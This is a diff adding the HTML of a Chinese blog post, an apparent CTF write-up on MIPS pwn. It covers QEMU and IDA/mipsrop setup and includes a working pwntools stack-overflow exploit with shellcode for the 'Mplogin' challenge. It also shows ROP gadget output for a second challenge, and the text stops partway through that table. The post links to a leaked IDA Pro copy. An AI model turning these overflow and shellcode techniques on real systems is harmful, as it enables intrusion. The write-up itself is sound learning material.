@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","version":"8.7.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="主要是汇编和调试方法要弄懂，做完这几个题应该也算入门了。感觉目前 ctf 中异构的 pwn 题以 arm 架构为主，mips 架构的比较少见，找到的题基本都是 hws 出的。题目囤了快半年，终于被我 pick 起来了😢 。之前卡住的原因主要出在工具上，前前后后踩了不少小白才会踩的坑，在复现前必须记录一下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Note | MIPS工具&amp;&amp;入门题汇总">
+<meta property="og:url" content="http://example.com/2021/08/23/mips-tools-and-ezpwn/index.html">
+<meta property="og:site_name" content="71&#39;s blog">
+<meta property="og:description" content="主要是汇编和调试方法要弄懂，做完这几个题应该也算入门了。感觉目前 ctf 中异构的 pwn 题以 arm 架构为主，mips 架构的比较少见，找到的题基本都是 hws 出的。题目囤了快半年，终于被我 pick 起来了😢 。之前卡住的原因主要出在工具上，前前后后踩了不少小白才会踩的坑，在复现前必须记录一下。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/07/30/jUXvaNlz5WQm4TM.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/30/SYkCmUgsW3cKHVL.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/30/LFHVbET9z3kpqsu.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/30/27MrjAc9yzFpaJq.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/30/IrMSEBxcj8O5A4f.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/30/uSzx8aceYWhRL9X.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/30/qwMdvBaCVAmZJo2.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/30/snO1VD5KjcYPAbH.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/30/59eS6fxnV3oWOdy.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/30/9b28UBcRuDTEwXv.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/05/msrNxDMJRHFkGZ8.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/05/CvfJiSY5Xm1rGb8.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/05/auFLiQx4ERT3GOc.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/TVCcawAPIks4ndL.png">
+<meta property="article:published_time" content="2021-08-23T09:16:57.000Z">
+<meta property="article:modified_time" content="2021-08-24T02:26:54.234Z">
+<meta property="article:author" content="7ee1n">
+<meta property="article:tag" content="mips">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/07/30/jUXvaNlz5WQm4TM.png">
+
+
+<link rel="canonical" href="http://example.com/2021/08/23/mips-tools-and-ezpwn/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/08/23/mips-tools-and-ezpwn/","path":"2021/08/23/mips-tools-and-ezpwn/","title":"Note | MIPS工具&&入门题汇总"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Note | MIPS工具&&入门题汇总 | 71's blog</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">71's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">1. tools</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MIPS%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83"><span class="nav-number">1.1.</span> <span class="nav-text">MIPS运行环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MIPSROP"><span class="nav-number">1.2.</span> <span class="nav-text">MIPSROP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">2. 题目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 缓冲区溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Mplogin"><span class="nav-number">2.1.1.</span> <span class="nav-text">Mplogin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn"><span class="nav-number">2.1.2.</span> <span class="nav-text">pwn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ctfshow-%E5%86%85%E9%83%A8%E8%B5%9B-babystack"><span class="nav-number">2.1.3.</span> <span class="nav-text">ctfshow 内部赛 babystack</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-%E5%A0%86%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 堆漏洞</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-overview">
+            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">7ee1n</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/08/23/mips-tools-and-ezpwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="7ee1n">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="71's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Note | MIPS工具&&入门题汇总
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-08-23 17:16:57" itemprop="dateCreated datePublished" datetime="2021-08-23T17:16:57+08:00">2021-08-23</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-08-24 10:26:54" itemprop="dateModified" datetime="2021-08-24T10:26:54+08:00">2021-08-24</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/mips/" itemprop="url" rel="index"><span itemprop="name">mips</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Symbols count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Symbols count in article: </span>
+      <span>8.6k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>8 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <blockquote>
+<p>主要是汇编和调试方法要弄懂，做完这几个题应该也算入门了。感觉目前 ctf 中异构的 pwn 题以 arm 架构为主，mips 架构的比较少见，找到的题基本都是 hws 出的。题目囤了快半年，终于被我 pick 起来了😢 。之前卡住的原因主要出在工具上，前前后后踩了不少小白才会踩的坑，在复现前必须记录一下。</p>
+</blockquote>
+<span id="more"></span>
+<h1>1. tools</h1>
+<p>分运行环境和逆向工具两部分。Buildroot 和 gdb-multiarch，应该有手就行。这里记录的都是我出过问题的工具。</p>
+<h2 id="MIPS运行环境"><a class="header-anchor" href="#MIPS运行环境">¶</a>MIPS运行环境</h2>
+<p>虚拟机是 x86 的平台，要运行 MIPS 指令集的程序就需要模拟运行环境。可以理解为虚拟机中的虚拟机 (?   原理是 Linux 的虚拟化技术： <a target="_blank" rel="noopener" href="https://www.redhat.com/zh/topics/virtualization/what-is-KVM">KVM是什么？一文带你快速了解Linux KVM 虚拟化 - Red Hat</a></p>
+<p>目前用的最多的虚拟器就是 QEMU 吧。它工作的原理也好理解，就是仿真，通过动态的二进制转换在 x86 架构的系统上执行其他架构的程序。说到这不得不提，这个二进制转换并不只能是复杂指令集向精简指令集的转换的，反之也行。具体例子：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1MU4y137Yi?from=search&amp;seid=13839685224042904734">给手机装Windows11！还能玩大型游戏？！_哔哩哔哩_bilibili</a> 。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install --install-suggests qemu</span><br></pre></td></tr></table></figure>
+<p>QEMU 有多个模式，最常见的是 qemu-user 和 qemu-system。顾名思义，qemu-user 是用户模式，用户一般只需运行程序，不需要接触到系统层面的配置。安装好后能在 <code>/usr/bin/</code> 下找到不同架构的模拟运行程序，图中的这些都是 qemu-user ，用它可以在 x86 平台上直接运行对应架构的程序。“直接运行”，也就是实现了交叉编译和交叉侦错。qemu 的这些模拟器跟 <code>arm-linux-gnueabihf</code> 、<code>aarch64-linux-gnu</code> 这些交叉编译器相似，而且安装完后它们都是在 <code>/usr</code> 下的。</p>
+<img src="https://i.loli.net/2021/07/30/jUXvaNlz5WQm4TM.png"  />
+<p>而 qemu-system 就是系统模式。模拟一个系统的运行包括镜像选择、网卡配置等用户模式设置不了的内容，它的运行相对也就多步骤些。需要目标架构的内核，模拟出目标系统后有用户名、密码，将程序上传到该系统执行、侦错就需要它能与 Linux 系统通信（也就是配置网卡、联网）… 这种情况下，异构的程序并非直接在 x86 上运行，而是在异构系统上运行，直接在 x86 上运行的是异构系统。</p>
+<img src="https://i.loli.net/2021/07/30/SYkCmUgsW3cKHVL.png"  />
+<p>讲了这么多理解的部分，是因为我觉着先理解后使用挺重要的。刚学的时候直接复制粘贴就用，不清楚工具的本质，也分不清它们的区别。（以至于国赛的时候给了个名字陌生的 qemu-user 就不会用了emmm）轩哥的文章给了很多链接，也写的很详细，看完应该差不多了：<a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/tools/2020/04/16/qemu/">QEMU使用记录  Clang裁缝店</a> 。</p>
+<h2 id="MIPSROP"><a class="header-anchor" href="#MIPSROP">¶</a>MIPSROP</h2>
+<p>用的是支持 MIPS 反汇编的 IDA Pro 7.5，下载链接： <a target="_blank" rel="noopener" href="https://github.com/VanHoevenTR/IDA_Pro_7.5">VanHoevenTR/IDA_Pro_7.5: IDA Pro 7.5 leak</a> 。</p>
+<p>直接解析二进制文件的时候会报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...\ida\plugins\idapython3_64.dll) error: 找不到指定的模块</span><br></pre></td></tr></table></figure>
+<p>原因是 python 的版本不正确。此时我的是 3.8 版本的，查了下，需要的是 3.9 的。（安装 3.9 的时候可以顺便勾选自动添加 PATH 的选项，之后用 pip 安装的时候就不用再配置或者找到 python  的目录了。）</p>
+<p>前面的链接里有个工具包 <code>ida75sp3_python39_win.zip</code>，用于配置 3.9 的环境。解压到 ida 根目录，全部覆盖，再运行 <code>idapyswitch.exe</code> 就可以了。不是 Windows 的可以下载对应版本：<a target="_blank" rel="noopener" href="https://hex-rays.com/blog/python-3-9-support-for-ida-7-5/">Python 3.9 support for IDA 7.5 – Hex Rays</a> 。</p>
+<p><img src="https://i.loli.net/2021/07/30/LFHVbET9z3kpqsu.png" alt=""></p>
+<p>之后运行报 <code>cannot import name 'ida_shims' from 'shims'</code> 的错，就是少了 shims 这个模块的意思。把 <a target="_blank" rel="noopener" href="https://github.com/tacnetsol/ida/tree/master/plugins"><br>
+ida/<strong>plugins</strong> at master · tacnetsol/ida</a> 的 shims 插件放进 plugins 目录下，或者用 <a target="_blank" rel="noopener" href="http://install.py">install.py</a> 把插件全下完也可以。到这一步基本上没什么报错了，也能进行 MIPS 的反汇编。除了这个 PowerPC Big Endian 的固件反汇编不出来： <a target="_blank" rel="noopener" href="https://paper.seebug.org/771/">基于 VxWorks 的嵌入式设备固件分析方法介绍</a> 。正常来说下面这种 MIPS 的elf 是没问题的，so 这个 PowerPC Big Endian 的我决定复现完再去整。</p>
+<img src="https://i.loli.net/2021/07/30/27MrjAc9yzFpaJq.png"  />
+<p>前面的插件已经包括 mipsrop 。如果装好了的话能在 <code>Edit -&gt; Plugins</code> 中看到。每次使用前需点击 <code>Search -&gt; mips rop gadgets </code>激活这个插件，idaPython 中 看到 <code>MIPS ROP Finder activated</code>就是可用状态了。使用命令可以输入 <code>mipsrop.help()</code>查看。</p>
+<img src="https://i.loli.net/2021/07/30/IrMSEBxcj8O5A4f.png"  />
+<h1>2. 题目</h1>
+<p>题目来源：<a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/">HWS赛题 入门 MIPS Pwn</a> 、<a target="_blank" rel="noopener" href="https://ctf.show/challenges%E3%80%82">https://ctf.show/challenges。</a></p>
+<h2 id="2-1-缓冲区溢出"><a class="header-anchor" href="#2-1-缓冲区溢出">¶</a>2.1 缓冲区溢出</h2>
+<blockquote>
+<p>重点关注 MIPS32 与 X86 架构下 函数调用与栈的不同之处。</p>
+</blockquote>
+<p>32个通用寄存器表：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">编号</th>
+<th style="text-align:center">寄存器名称</th>
+<th style="text-align:center">寄存器描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">$0</td>
+<td style="text-align:center">$zero</td>
+<td style="text-align:center">始终为0，用于辅助运算判断、创建伪指令等</td>
+</tr>
+<tr>
+<td style="text-align:center">$1</td>
+<td style="text-align:center">$at</td>
+<td style="text-align:center">保留寄存器，用作汇编器的暂时变量</td>
+</tr>
+<tr>
+<td style="text-align:center">$2、$3</td>
+<td style="text-align:center">$v0、$v1</td>
+<td style="text-align:center">values，子程序返回值/非浮点结果（不够用时用内存）</td>
+</tr>
+<tr>
+<td style="text-align:center">$4/5/6/7</td>
+<td style="text-align:center">$a0/1/2/3</td>
+<td style="text-align:center">aruments，函数的前四个参数（不够时用堆栈处理）</td>
+</tr>
+<tr>
+<td style="text-align:center">$8~$15</td>
+<td style="text-align:center">$t0/1/…/7</td>
+<td style="text-align:center">temporaries，计算时用的临时寄存器</td>
+</tr>
+<tr>
+<td style="text-align:center">$16~$23</td>
+<td style="text-align:center">$s0/1/…/7</td>
+<td style="text-align:center">saved values，保留现场</td>
+</tr>
+<tr>
+<td style="text-align:center">$24、$25</td>
+<td style="text-align:center">$t8、$t9</td>
+<td style="text-align:center">temporaries，补充前面的 $t0 ~ $t7</td>
+</tr>
+<tr>
+<td style="text-align:center">$26、$27</td>
+<td style="text-align:center">$k0、$k1</td>
+<td style="text-align:center">中断处理函数用于保存系统参数</td>
+</tr>
+<tr>
+<td style="text-align:center">$28</td>
+<td style="text-align:center">$gp</td>
+<td style="text-align:center">global pointer，全局指针</td>
+</tr>
+<tr>
+<td style="text-align:center">$29</td>
+<td style="text-align:center">$sp</td>
+<td style="text-align:center">stack pointer，堆栈指针，指向栈顶</td>
+</tr>
+<tr>
+<td style="text-align:center">$30</td>
+<td style="text-align:center">$fp</td>
+<td style="text-align:center">frame pointer，保存栈指针（GNU）或$s8（SGI）</td>
+</tr>
+<tr>
+<td style="text-align:center">$31</td>
+<td style="text-align:center">$ra</td>
+<td style="text-align:center">return address，返回地址</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>返回地址：直接存入 $ra，不是堆栈。但嵌套调用的时候，被调函数1会先把原 $ra 的值压入堆栈，再进行下一次调用，此时 $ra 存放的是被调函数2的返回地址。</li>
+</ul>
+<img src="https://i.loli.net/2021/07/30/uSzx8aceYWhRL9X.png" style="zoom: 50%;" />
+<p>栈溢出漏洞的利用在叶子和非叶子函数间的主要区别就是，覆盖的是谁的返回地址。非叶子的情况和 x86 很像，比如上图的 B 函数，栈帧中存的是自己的返回地址（A），这时栈溢出能修改的就是它本身的返回地址。而像 C 这种叶子函数，本身的返回地址在 $ra 寄存器中，但payload足够长的话，能覆盖到 B 的栈帧，修改其父函数的返回地址。</p>
+<h3 id="Mplogin"><a class="header-anchor" href="#Mplogin">¶</a>Mplogin</h3>
+<blockquote>
+<p>mips-32-little</p>
+</blockquote>
+<p>给出了两种运行方式。一种是把 so 文件放在本地的 <code>/lib/</code> 下、直接运行，一种是用 qemu-user运行、需要指定lib路径（注意是lib文件夹，不是so文件）。前面说到异构程序的运行需要交叉编译的工具辅助，这里的第一种方式并没有用到，看来关键在动态链接库。</p>
+<img src="https://i.loli.net/2021/07/30/qwMdvBaCVAmZJo2.png"  />
+<p>漏洞点在输入密码的函数中。可以覆盖到 Password 输入时的长度参数位置，从而输入Passsword 时有栈溢出，也就是第二个 read 的时候。程序什么保护都没开，直接往栈上写 shellcode 跳转过去就可以了。</p>
+<img src="https://i.loli.net/2021/07/30/snO1VD5KjcYPAbH.png" style="zoom: 80%;" />
+<p>栈地址怎么泄露呢。输密码之前还有一个函数，看栈帧的时候发现，输入的变量v1后面就是 $fp 和 $ra 的值。输出用的是 printf 函数，v1填满时就能泄露出来。这个函数是由 main 调用的，是叶子函数。因此 $ra 存的是main的地址，$fp存的是进入这个函数前的栈顶地址。</p>
+<p><img src="https://i.loli.net/2021/07/30/59eS6fxnV3oWOdy.png" alt=""></p>
+<p>该函数执行完后栈空间会回收，栈顶变回进入前的地址，下次进入设置密码函数时的栈顶也是这里。因此泄露这个地址就相当于拿到了栈溢出漏洞函数的栈顶地址。我在调试的过程中发现，在ubuntu 16中运行程序，栈溢出泄露不出数据，换成18又可以了… 当踩个坑吧，还不知道为何如此😰。</p>
+<img src="https://i.loli.net/2021/07/30/9b28UBcRuDTEwXv.png"  />
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,binary=ELF(<span class="string">&#x27;./Mplogin&#x27;</span>))</span><br><span class="line">p=process(<span class="string">&#x27;./Mplogin&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process([&#x27;qemu-mipsel&#x27;, &#x27;-L&#x27;, &#x27;./&#x27;,&#x27;-g&#x27;,&#x27;2364&#x27;, &#x27;./Mplogin&#x27;])</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./Mplogin&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s: p.recvuntil(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s: p.recv(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> s: p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s: p.send(s)</span><br><span class="line">it = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line">name=<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">name=name.ljust(<span class="number">24</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;Username :&#x27;</span>)</span><br><span class="line">sd(name)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;adminaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">stack=u32(rv(<span class="number">4</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">py=<span class="string">&#x27;access&#x27;</span></span><br><span class="line">py=py.ljust(<span class="number">20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">py+=p32(<span class="number">0x100</span>)</span><br><span class="line">ru(<span class="string">&#x27;Pre_Password :&#x27;</span>)</span><br><span class="line">sl(py)</span><br><span class="line"></span><br><span class="line">pwd=<span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line">pwd=pwd.ljust(<span class="number">40</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">pwd+=p32(stack)+asm(shellcraft.sh())</span><br><span class="line">ru(<span class="string">&#x27;Password :&#x27;</span>)</span><br><span class="line">sl(pwd)</span><br><span class="line"></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
+<h3 id="pwn"><a class="header-anchor" href="#pwn">¶</a>pwn</h3>
+<blockquote>
+<p>mips-32-big</p>
+</blockquote>
+<p>程序整体逻辑是：</p>
+<ol>
+<li>输入组数，后创建 n 组大小为 0x24 的空间（栈上）。</li>
+<li>输入n次 id 和用户名，在对应组的位置存储。</li>
+</ol>
+<p><img src="https://i.loli.net/2021/08/05/msrNxDMJRHFkGZ8.png" alt=""></p>
+<p>堆溢出和栈溢出（长度和id均未规定）漏洞都有。可以通过 memcpy 的溢出，覆盖到返回地址。由于堆溢出漏洞，可写入 0x300  的 payload，应该是足够长的。</p>
+<p><img src="https://i.loli.net/2021/08/05/CvfJiSY5Xm1rGb8.png" alt=""></p>
+<p>先确定偏移吧。说下调试过程。</p>
+<p>一开始用的是 <code>gdb-multiarch</code> ，<code>target remote</code> 后下断点，再 <code>continue</code> ，每次都报 <code>L1_MAP_ADDR_SPACE_BITS</code> 的错误或者断不下来。用 <code>ida remote debug</code> 应该可以。用移植到 ubuntu 上的 ida 会更好些，避免文件复制到 Windows 后符号链接丢失等问题。如果还是想在 qemu-user 的状态下进行尝试，还是能用 x86 的 gdb 调的：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ba12cd4e530a">路由器漏洞利用入门- 简书</a> 。但 cyclic 用起来很不方便，因为程序是用 qemu 运行的，因此要复制到脚本上再运行调试。其实直接看栈帧也可以算出来，用 <code>gdb-multiarch</code> remote 过去后，不下断点也能看到返回地址有没有被覆盖。</p>
+<p>用户名经 strchr 函数返回后，把起始位置赋给 <code>cur_i</code> 。这里的输入位置与 <code>$ra</code> 的距离 就是 <code>0x14+0x24+0x58=0x90</code> 。</p>
+<p><img src="https://i.loli.net/2021/08/05/auFLiQx4ERT3GOc.png" alt=""></p>
+<p>因为返回地址范围不合法，即使不下断点也能看出是否覆盖到了：</p>
+<p><img src="https://i.loli.net/2021/08/04/TVCcawAPIks4ndL.png" alt=""></p>
+<p>接下来就是写shellcode了。堆地址、栈地址、libc没有办法泄露，加上没有开启地址随机化，可以使用 rop gadget。利用 <code>MIPSROP</code> ，找到下面的这些 gadget。基本上都是 <code>add $sp,(...)</code> 后，储存在一个寄存器 A 中，再 jmp 到另一个寄存器 B 上执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">MIPS ROP Finder activated, found 842 controllable jumps between 0x00400000 and 0x004740A0</span><br><span class="line">Python&gt;mipsrop.stackfinder()</span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                       |  Control Jump                          |</span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x004273C4  |  addiu $a2,$sp,0x70+var_C                     |  jalr  $s0                             |</span><br><span class="line">|  0x0042BCD0  |  addiu $a2,$sp,0x88+var_C                     |  jalr  $s2                             |</span><br><span class="line">|  0x0042FA00  |  addiu $v1,$sp,0x138+var_104                  |  jalr  $s1                             |</span><br><span class="line">|  0x004491F8  |  addiu $a2,$sp,0x44+var_C                     |  jalr  $s1                             |</span><br><span class="line">|  0x0044931C  |  addiu $v0,$sp,0x30+var_8                     |  jalr  $s1                             |</span><br><span class="line">|  0x00449444  |  addiu $a2,$sp,0x44+var_C                     |  jalr  $s1                             |</span><br><span class="line">|  0x0044AD58  |  addiu $a1,$sp,0x60+var_28                    |  jalr  $s4                             |</span><br><span class="line">|  0x0044AEFC  |  addiu $a1,$sp,0x64+var_28                    |  jalr  $s5                             |</span><br><span class="line">|  0x0044B154  |  addiu $a1,$sp,0x6C+var_38                    |  jalr  $s2                             |</span><br><span class="line">|  0x0044B1EC  |  addiu $v0,$sp,0x6C+var_40                    |  jalr  $s2                             |</span><br><span class="line">|  0x0044B3EC  |  addiu $v0,$sp,0x170+var_130                  |  jalr  $s0                             |</span><br><span 